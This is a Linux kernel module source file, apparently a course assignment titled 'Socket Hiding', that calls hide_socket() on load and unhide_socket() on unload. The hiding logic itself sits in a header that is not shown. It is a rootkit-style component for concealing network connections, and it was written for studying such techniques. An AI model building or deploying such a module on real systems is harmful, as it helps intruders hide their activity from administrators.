#include <linux/module.h> /* Needed by all modules */
#include <linux/kernel.h> /* Needed for KERN_INFO */
#include <linux/init.h> /* Needed for the macros, hints for linking and loading, see http://tldp.org/LDP/lkmpg/2.6/html/x245.html */

#include "socket_hiding.h"

MODULE_LICENSE("GPL");

#define DRIVER_AUTHOR "Nicolas Appel, Wenwen Chen"
#define DRIVER_DESC   "Assigment 6 - Socket Hiding"

static int __init mod_init(void)
{
  hide_socket();
  printk(KERN_INFO "Hide Sockets\n");
  return 0;
}

static void __exit mod_exit(void)
{
  unhide_socket();
  printk(KERN_INFO "Unhide Sockets\n");
}



module_init(mod_init);
module_exit(mod_exit);

MODULE_AUTHOR(DRIVER_AUTHOR);
MODULE_DESCRIPTION(DRIVER_DESC);
MODULE_LICENSE("GPL");

